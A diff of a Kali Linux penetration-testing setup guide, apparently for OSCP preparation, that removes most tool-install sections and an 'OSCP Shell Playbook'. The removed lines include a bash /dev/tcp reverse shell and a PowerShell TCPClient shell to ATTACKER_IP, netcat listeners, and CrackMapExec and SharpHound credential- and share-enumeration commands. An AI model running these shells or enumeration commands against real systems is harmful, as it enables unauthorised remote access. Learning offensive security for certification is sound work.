@@ -12,30 +12,14 @@ Philosophy:
 This guide is organized **top-down in execution order**.
 
 ---
-
 ## 0. Assumptions
 
 * Kali Linux **kali-linux-default** desktop image
 * You have sudo access
 * Internet access is available during setup
 * You will later replace parts of this with custom scripts
-
 ---
-
 ## 1. One-Liner: Full Base Setup (Fast Path)
-
-This installs **everything except Nessus** in one go.
-
-```bash
-sudo apt update && sudo apt install -y \
-  git curl wget rlwrap socat \
-  bloodhound sharphound crackmapexec \
-  nuclei subfinder httpx-toolkit getallurls arjun \
-  rubeus seclists \
-  firefox-esr burpsuite \
-  golang-go neo4j && \
-  nuclei -update-templates
-```
 
 Upstream (non-Kali) tools:
 
@@ -140,114 +124,6 @@ Optional:
 * Install extensions only if needed
 
 ---
-
-## 5. Tooling Not in Default Kali (Individual Installs)
-
-### BloodHound CE + Neo4j
-
-```bash
-sudo apt install -y bloodhound neo4j
-sudo bloodhound-setup
-sudo bloodhound
-```
-
-Access:
-
-```
-http://localhost:7474
-```
-
-Use:
-
-* Import SharpHound zip
-* Run "Shortest Paths to Domain Admins"
-
----
-
-### SharpHound
-
-```bash
-sudo apt install -y sharphound
-ls -la /usr/share/sharphound
-```
-
-Windows usage:
-
-```powershell
-Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
-```
-
----
-
-### CrackMapExec
-
-```bash
-sudo apt install -y crackmapexec
-```
-
-Examples:
-
-```bash
-crackmapexec smb 10.10.10.0/24
-crackmapexec smb 10.10.10.10 -u user -p pass --shares
-```
-
----
-
-### Nuclei
-
-```bash
-sudo apt install -y nuclei
-nuclei -update-templates
-```
-
----
-
-### Subfinder
-
-```bash
-sudo apt install -y subfinder
-subfinder -d target.tld -silent
-```
-
----
-
-### httpx
-
-```bash
-sudo apt install -y httpx-toolkit
-cat subs.txt | httpx -mc 200 -title -tech-detect
-```
-
----
-
-### GAU
-
-```bash
-sudo apt install -y getallurls
-getallurls target.tld
-```
-
----
-
-### Arjun
-
-```bash
-sudo apt install -y arjun
-arjun -u https://target/search.php -m GET
-```
-
----
-
-### Rubeus
-
-```bash
-sudo apt install -y rubeus
-ls /usr/share/windows-resources/rubeus/
-```
-
----
-
 ### Kerbrute
 
 ```bash
@@ -255,7 +131,6 @@ kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
 ```
 
 ---
-
 ### Katana
 
 ```bash
@@ -263,64 +138,10 @@ katana -u https://target.tld -silent
 ```
 
 ---
-
-### Dalfox
+### Dalfo
 
 ```bash
 dalfox url "https://target/page.php?x=1"
-```
-
----
-
-## 6. OSCP Shell Playbook (Local Reference)
-
-### Listeners
-
-```bash
-rlwrap nc -lvnp 4444
-socat file:`tty`,raw,echo=0 tcp-listen:4444
-```
-
-### Linux Reverse Shells
-
-```bash
-bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
-```
-
-### Windows Reverse Shells
-
-```powershell
-powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);..."
-```
-
-### TTY Upgrade
-
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-
----
-
-## 7. Offline Cache (Critical)
-
-```bash
-mkdir -p ~/oscp/offline && cd ~/oscp/offline
-```
-
-Clone:
-
-```bash
-git clone https://github.com/carlospolop/PEASS-ng.git
-git clone https://github.com/GTFOBins/GTFOBins.github.io.git
-git clone https://github.com/LOLBAS-Project/LOLBAS.git
-git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
-git clone https://github.com/danielmiessler/SecLists.git
-```
-
-Verify:
-
-```bash
-ls ~/oscp/offline
 ```
 
 ---
